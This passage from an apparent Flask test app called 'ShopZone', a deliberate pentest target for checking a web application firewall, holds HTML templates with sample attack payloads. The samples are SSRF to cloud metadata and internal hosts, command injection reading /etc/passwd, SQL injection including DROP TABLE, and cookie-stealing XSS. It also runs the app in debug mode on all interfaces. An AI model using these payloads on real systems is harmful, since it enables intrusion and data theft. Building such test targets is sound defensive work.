          <div class="hint-box">SSRF: http://169.254.169.254/latest/meta-data/</div>
          <div class="hint-box">SSRF: http://localhost:6379 (Redis)</div>
          <div class="hint-box">SSRF: http://192.168.1.1/admin</div>
        </div>
        <button type="submit" class="btn btn-primary" style="font-size:13px">Test Redirect</button>
      </form>
    </div>

  </div>

  <div class="card" style="padding:20px;margin-top:20px">
    <h3 style="margin-bottom:16px;color:#888;font-size:14px">🔗 API Endpoint Tests</h3>
    <div style="display:flex;gap:10px;flex-wrap:wrap">
      <a href="/api/ping?host=127.0.0.1; cat /etc/passwd" class="btn btn-outline" style="font-size:12px">CMDi in ping</a>
      <a href="/api/fetch?url=http://169.254.169.254/latest/meta-data/" class="btn btn-outline" style="font-size:12px">SSRF in fetch</a>
      <a href="/api/user?id=1 UNION SELECT * FROM users--" class="btn btn-outline" style="font-size:12px">SQLi in API</a>
      <a href="/api/user?id=1&sort=name; DROP TABLE users--" class="btn btn-outline" style="font-size:12px">Stacked queries</a>
    </div>
  </div>

</div>
<footer>ShopZone · <a href="http://localhost:3000">Dashboard</a></footer>
</body>
</html>"""


REGISTER_PAGE = """<!DOCTYPE html>
<html>
<head>
  <title>Register — ShopZone</title>
  """ + BASE_STYLE + """
  <style>
    body{display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f0f2f5}
    .wrap{width:480px;background:#fff;border-radius:12px;padding:40px;box-shadow:0 10px 40px rgba(0,0,0,0.1)}
  </style>
</head>
<body>
<div class="wrap">
  <div style="text-align:center;margin-bottom:24px">
    <div style="font-size:36px">📝</div>
    <h2 style="margin:8px 0 4px">Create Account</h2>
    <span class="badge-protected">🛡️ Protected by SentinelShield</span>
  </div>

  {% if success %}<div class="success-msg">✅ {{ success }}</div>{% endif %}
  {% if error %}<div class="error-msg">❌ {{ error }}</div>{% endif %}

  <form method="POST">
    <div class="form-group">
      <label>Full Name</label>
      <input name="name" placeholder="John Doe" />
      <div class="hint-box">XSS: &lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>
    </div>
    <div class="form-group">
      <label>Email</label>
      <input name="email" type="text" placeholder="john@example.com" />
      <div class="hint-box">XSS: test@test.com&lt;script&gt;alert(1)&lt;/script&gt;</div>
    </div>
    <div class="form-group">
      <label>Password</label>
      <input name="password" type="password" placeholder="Min 8 characters" />
    </div>
    <div class="form-group">
      <label>Phone</label>
      <input name="phone" placeholder="+91 9999999999" />
      <div class="hint-box">CMDi: +91; cat /etc/passwd</div>
    </div>
    <button type="submit" class="btn btn-primary" style="width:100%;padding:12px">Create Account</button>
  </form>
  <p style="text-align:center;margin-top:16px;font-size:13px;color:#888">
    Already have an account? <a href="/login" style="color:#1a1a2e;font-weight:600">Login</a>
  </p>
  <p style="text-align:center;margin-top:8px"><a href="/" style="color:#888;font-size:13px">← Back to Home</a></p>
</div>
</body>
</html>"""


if __name__ == '__main__':
    print("\n" + "="*60)
    print("  🛒 ShopZone — Realistic Pentest Target")
    print("  Protected by SentinelShield WAF")
    print("="*60)
    print("  App:       http://localhost:5000")
    print("  Dashboard: http://localhost:3000")
    print("  API Docs:  http://localhost:8000/docs")
    print("="*60)
    print("  Pages to attack:")
    print("  /login    → SQL Injection")
    print("  /search   → SQLi, XSS")
    print("  /product  → LFI, XSS")
    print("  /contact  → XSS, CMDi")
    print("  /profile  → CMDi, SSRF")
    print("  /api/ping → Command Injection")
    print("  /api/fetch→ SSRF")
    print("="*60 + "\n")
    app.run(debug=True, port=5000, host='0.0.0.0')
